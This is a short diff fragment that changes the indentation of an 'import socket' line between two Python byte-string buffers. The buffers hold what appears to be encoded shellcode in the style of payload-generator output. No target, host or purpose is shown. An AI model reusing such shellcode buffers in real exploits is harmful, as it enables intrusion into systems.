@@ -336,7 +336,7 @@
             buf += b"\x1d\xfc\x13\x5b\x18\xb8\x93\xb0\x50\xd1\x71\xb6"
             buf += b"\xc7\xd2\x53"
     
-            [>>]    import socket
+        [>>]    import socket
 
                 buf =  b""
                 buf += b"\xdb\xc7\xba\xb8\x9e\x3d\xea\xd9\x74\x24\xf4\x58"
